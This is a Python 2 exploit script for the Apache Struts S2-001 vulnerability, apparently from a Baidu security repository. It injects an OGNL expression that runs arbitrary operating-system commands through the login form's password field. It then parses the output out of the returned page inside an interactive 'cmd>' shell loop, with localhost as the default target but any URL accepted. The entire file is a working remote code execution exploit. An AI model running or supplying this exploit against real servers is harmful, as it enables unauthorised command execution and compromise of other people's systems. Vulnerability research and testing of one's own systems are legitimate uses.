##############################################################################
#
# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
"""
struts s02-001 exploit


Date: 2017/06/26 17:10:00
"""
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import ssl
import sys
import httplib
import urllib
import urllib2
import fileinput

PATTERN = re.compile(r'<input type="text" name="password" value="([^"]*)"')


def _run(url, cmd):
    url = url + '/login.action'

    password = r'%{@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("'
    password += cmd
    password += r'").getInputStream(),"utf-8")}'

    try:
        data = urllib.urlencode({'password': password, 'username': ''})
        headers = {'User-Agent': 'Mozilla/5.0'}
        request = urllib2.Request(url, data=data, headers=headers)
        page = urllib2.urlopen(request).read()
        m = PATTERN.search(page)
        if m is not None:
            print(m.group(1))
            return m.group(1)
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page

if __name__ == "__main__":
    url = 'http://localhost:8080/S2-001' if len(sys.argv) == 1 else sys.argv[1]
    print 'URL=' + url

    while True:
        try:
            line = raw_input("cmd> ").strip()
            if line == 'exit':
                sys.exit()
            _run(url, line)
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
